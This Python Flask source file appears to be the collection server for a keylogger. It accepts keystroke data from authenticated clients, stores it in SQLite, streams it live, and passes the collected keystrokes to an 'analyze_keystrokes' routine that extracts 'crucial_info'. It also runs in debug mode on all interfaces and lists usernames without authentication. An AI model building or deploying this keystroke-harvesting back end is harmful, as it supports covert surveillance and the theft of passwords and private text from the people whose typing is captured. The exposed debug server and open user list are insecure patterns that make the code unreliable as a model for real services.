from flask import Flask, request, jsonify, render_template, Response, g
import sqlite3
import os
import time
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
from ai_analysis import analyze_keystrokes

app = Flask(__name__)

DATABASE = os.path.join(os.path.dirname(__file__), 'logs.db')

# ---------------------- Database Helpers ----------------------

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    db = get_db()
    cursor = db.cursor()
    cursor.execute(
        'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, '
        'username TEXT UNIQUE NOT NULL, password TEXT NOT NULL)'
    )
    cursor.execute(
        'CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, '
        'user_id INTEGER NOT NULL, log TEXT NOT NULL, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, '
        'FOREIGN KEY(user_id) REFERENCES users(id))'
    )
    db.commit()

# Initialize database when the server starts
with app.app_context():
    init_db()

# ---------------------- Authentication ----------------------

def get_user(username):
    cur = get_db().execute('SELECT * FROM users WHERE username=?', (username,))
    return cur.fetchone()

def check_auth(username, password):
    user = get_user(username)
    if user and check_password_hash(user['password'], password):
        g.user = user
        return True
    return False

def authenticate():
    resp = jsonify({'message': 'Authentication required'})
    resp.status_code = 401
    resp.headers['WWW-Authenticate'] = 'Basic realm="Login Required"'
    return resp

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

# ---------------------- Routes ----------------------

live_keys = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    if not username or not password:
        return jsonify({'status': 'error', 'message': 'username and password required'}), 400
    db = get_db()
    try:
        db.execute('INSERT INTO users (username, password) VALUES (?, ?)',
                   (username, generate_password_hash(password)))
        db.commit()
    except sqlite3.IntegrityError:
        return jsonify({'status': 'error', 'message': 'user already exists'}), 400
    return jsonify({'status': 'success', 'message': 'user registered'})

@app.route('/log', methods=['POST'])
@requires_auth
def log():
    data = request.json or {}
    key_data = data.get('key_data', '')
    user_id = g.user['id']

    db = get_db()
    db.execute('INSERT INTO logs (user_id, log) VALUES (?, ?)', (user_id, key_data))
    db.commit()

    username = g.user['username']
    if username not in live_keys:
        live_keys[username] = []
    live_keys[username].append(key_data)

    return jsonify({'status': 'success', 'message': 'Keystroke logged successfully'})

@app.route('/logs/<user>', methods=['GET'])
@requires_auth
def get_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = [row['log'] for row in cur.fetchall()]
    return jsonify({'status': 'success', 'logs': logs})

@app.route('/users', methods=['GET'])
def get_users():
    db = get_db()
    cur = db.execute('SELECT username FROM users')
    users = [row['username'] for row in cur.fetchall()]
    return jsonify({'status': 'success', 'users': users})

@app.route('/clear_logs/<user>', methods=['DELETE'])
@requires_auth
def clear_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    db.execute('DELETE FROM logs WHERE user_id=?', (g.user['id'],))
    db.commit()
    live_keys.pop(user, None)
    return jsonify({'status': 'success', 'message': f'Logs cleared for {user}'})

@app.route('/log_status', methods=['GET'])
def log_status():
    return jsonify({'status': 'running'})

@app.route('/view_logs/<user>')
@requires_auth
def view_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = [row['log'] for row in cur.fetchall()]
    logs_dict = {user: logs}
    return render_template('view_logs.html', user=user, logs=logs_dict)

@app.route('/live_logs/<user>')
@requires_auth
def live_logs(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    return render_template('live_logs.html', user=user)

@app.route('/live_logs_stream/<user>')
@requires_auth
def live_logs_stream(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403

    def generate():
        while True:
            if user in live_keys:
                while live_keys[user]:
                    key = live_keys[user].pop(0)
                    yield f"data: {key}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/analyze/<user>', methods=['GET'])
@requires_auth
def analyze(user):
    if g.user['username'] != user:
        return jsonify({'status': 'error', 'message': 'forbidden'}), 403
    db = get_db()
    cur = db.execute('SELECT log FROM logs WHERE user_id=? ORDER BY id', (g.user['id'],))
    logs = ''.join(row['log'] for row in cur.fetchall())
    crucial_info = analyze_keystrokes(logs)
    return jsonify({'status': 'success', 'crucial_info': crucial_info})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
